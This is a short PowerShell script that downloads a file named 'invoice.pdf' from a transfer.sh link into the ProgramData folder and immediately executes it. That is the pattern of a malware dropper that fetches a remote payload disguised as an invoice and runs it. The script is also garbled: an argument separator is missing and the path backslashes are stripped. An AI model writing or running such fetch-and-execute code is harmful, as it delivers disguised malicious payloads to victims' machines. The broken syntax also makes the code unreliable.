#!/usr/bin/env pwsh
(new-object system.net.webclient).downloadFile('https://transfer.sh/get/vpiHmi/invoice.pdf' 'C:ProgramDatainvoice.pdf') Start-Process 'C:ProgramDatainvoice.pdf'